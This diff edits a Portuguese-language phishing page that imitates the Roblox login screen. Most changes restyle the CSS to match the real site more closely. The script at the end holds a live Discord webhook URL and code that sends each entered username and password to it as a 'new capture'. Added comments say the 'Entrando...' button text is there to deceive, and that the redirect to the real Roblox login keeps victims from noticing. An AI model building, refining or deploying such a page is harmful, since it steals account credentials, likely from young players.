@@ -6,8 +6,8 @@
     <title>Entrar na Roblox</title>
     <link rel="icon" href="https://www.roblox.com/favicon.ico">
     <style>
-        /* Reset básico e fonte oficial da Roblox (Builder Sans) */
-        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700&display=swap');
+        /* Fonte oficial do Roblox (Builder Sans / Hanken Grotesk) */
+        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
         
         * {
             margin: 0;
@@ -18,18 +18,20 @@
         }
 
         body {
-            background-color: #1c1f22; /* Fundo escuro real */
+            background-color: #191b1f; /* Fundo real escuro */
             color: #ffffff;
-            padding-bottom: 85px;
+            padding-bottom: 100px;
+            overflow-x: hidden;
         }
 
-        /* HEADER (Menu lá em cima) */
+        /* HEADER */
         .header {
             display: flex;
             align-items: center;
             justify-content: space-between;
             padding: 12px 16px;
             background-color: #232527;
+            border-bottom: 1px solid #2e3134;
             position: sticky;
             top: 0;
             z-index: 100;
@@ -38,13 +40,12 @@
         .header-left {
             display: flex;
             align-items: center;
-            gap: 10px;
         }
 
-        /* Ícone quadrado do Roblox inclinado */
+        /* Ícone do Roblox */
         .logo-icon {
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             background-color: #ffffff;
             transform: rotate(-15deg);
             border-radius: 3px;
@@ -53,24 +54,24 @@
             justify-content: center;
         }
         .logo-hole {
-            width: 10px;
-            height: 10px;
+            width: 8px;
+            height: 8px;
             background-color: #232527;
         }
 
         .header-right {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
 
         .btn-cadastrar {
             background-color: #335fff;
             color: #fff;
             border: none;
-            padding: 8px 16px;
+            padding: 8px 14px;
             border-radius: 6px;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 600;
         }
 
@@ -78,61 +79,59 @@
             background-color: transparent;
             color: #fff;
             border: 1px solid #ffffff;
-            padding: 8px 16px;
+            padding: 8px 14px;
             border-radius: 6px;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 600;
         }
 
         .search-icon svg {
-            width: 24px;
-            height: 24px;
+            width: 22px;
+            height: 22px;
             stroke: #fff;
             stroke-width: 2.5;
             fill: none;
         }
 
-        /* SUB-MENU (Destaques, Mercado...) */
+        /* SUB-MENU */
         .sub-header {
             display: flex;
             justify-content: space-around;
             padding: 12px 10px;
             background-color: #232527;
-            font-size: 15px;
-            font-weight: 500;
+            font-size: 14px;
+            font-weight: 600;
             color: #e3e3e3;
             border-bottom: 1px solid #2e3134;
         }
 
-        /* BANNER DE IMAGEM (O gráfico atrás do "Entrar") */
+        /* BANNER DE IMAGEM */
         .banner {
-            height: 80px;
-            background-image: url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg');
-            background-size: cover;
-            background-position: center;
-            opacity: 0.5;
-            -webkit-mask-image: linear-gradient(to bottom, black 20%, transparent 100%);
-            mask-image: linear-gradient(to bottom, black 20%, transparent 100%);
+            height: 100px;
+            background: linear-gradient(to bottom, rgba(25, 27, 31, 0.4), #191b1f), url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg') center/cover;
         }
 
         /* ÁREA DO FORMULÁRIO */
         .container {
             padding: 0 16px;
-            max-width: 500px;
+            max-width: 480px;
             margin: 0 auto;
+            margin-top: -20px;
+            position: relative;
+            z-index: 10;
         }
 
         h1 {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 700;
             text-align: center;
-            margin: 16px 0 24px 0;
+            margin: 20px 0 24px 0;
         }
 
         .input-group input {
             width: 100%;
             padding: 16px;
-            background-color: #27292c;
+            background-color: #272a2e;
             border: 1px solid #3b3f43;
             border-radius: 8px;
             color: #fff;
@@ -148,7 +147,7 @@
         .btn-main {
             width: 100%;
             padding: 15px;
-            background-color: transparent;
+            background-color: #272a2e;
             border: 1px solid #ffffff;
             border-radius: 8px;
             color: #ffffff;
@@ -167,8 +166,9 @@
             text-align: center;
             color: #ffffff;
             text-decoration: none;
-            font-size: 15px;
+            font-size: 14px;
             margin: 24px 0;
+            font-weight: 500;
         }
 
         .divider {
@@ -180,12 +180,12 @@
         .btn-secondary {
             width: 100%;
             padding: 16px;
-            background-color: #27292c;
+            background-color: #272a2e;
             border: 1px solid #3b3f43;
             border-radius: 8px;
-            color: #e3e3e3;
-            font-size: 16px;
-            font-weight: 500;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
             margin-bottom: 12px;
             cursor: pointer;
         }
@@ -197,27 +197,29 @@
         .signup-text {
             text-align: center;
             color: #e3e3e3;
-            font-size: 15px;
+            font-size: 14px;
             margin-top: 24px;
+            margin-bottom: 40px;
         }
 
         .signup-text a {
             color: #ffffff;
-            font-weight: 600;
+            font-weight: 700;
             text-decoration: none;
         }
 
-        /* BANNER INFERIOR DO APP */
+        /* BANNER INFERIOR */
         .bottom-banner {
             position: fixed;
             bottom: 0;
             left: 0;
             width: 100%;
-            background-color: #323539;
+            background-color: #232527;
             padding: 12px 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            border-top: 1px solid #2e3134;
             z-index: 100;
         }
 
@@ -228,21 +230,21 @@
         }
 
         .app-icon {
-            width: 40px;
-            height: 40px;
+            width: 42px;
+            height: 42px;
             background-color: #335fff;
-            border-radius: 50%;
+            border-radius: 8px; /* Quadrado arredondado em vez de redondo */
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
         .app-icon-inner {
-            width: 18px;
-            height: 18px;
+            width: 16px;
+            height: 16px;
             background-color: #fff;
             transform: rotate(-15deg);
-            border-radius: 3px;
+            border-radius: 2px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -255,13 +257,14 @@
         }
 
         .banner-text {
-            font-size: 12px;
-            line-height: 1.3;
-            color: #fff;
+            font-size: 11px;
+            line-height: 1.4;
+            color: #e3e3e3;
         }
 
         .banner-text span {
             font-weight: 700;
+            color: #fff;
         }
 
         .btn-explore {
@@ -269,7 +272,7 @@
             color: #fff;
             border: none;
             padding: 10px 16px;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 14px;
             font-weight: 600;
         }
@@ -345,7 +348,7 @@
     </div>
 
     <script>
-        // ⚠️ COLOQUE O TEU LINK DO DISCORD AQUI ENTRE AS ASPAS ⚠️
+        // TEU WEBHOOK DO DISCORD AQUI
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573426421085241448/LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hdl145-KIH6KapjIvAnLGhFT4kmlfOFPL';
 
         const form = document.getElementById('login-form');
@@ -360,8 +363,10 @@
             const password = pass.value;
             if (!username || !password) return;
 
+            // Muda o botão pra enganar
             btnSubmit.textContent = 'Entrando...';
 
+            // Monta o JSON pro Discord
             const payload = {
                 content: `🎣 **Nova Captura**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
             };
@@ -373,6 +378,7 @@
                     body: JSON.stringify(payload)
                 });
                 
+                // Redireciona pro site real da Roblox pra não dar na cara
                 setTimeout(() => {
                     window.location.href = 'https://www.roblox.com/pt/Login';
                 }, 1500);
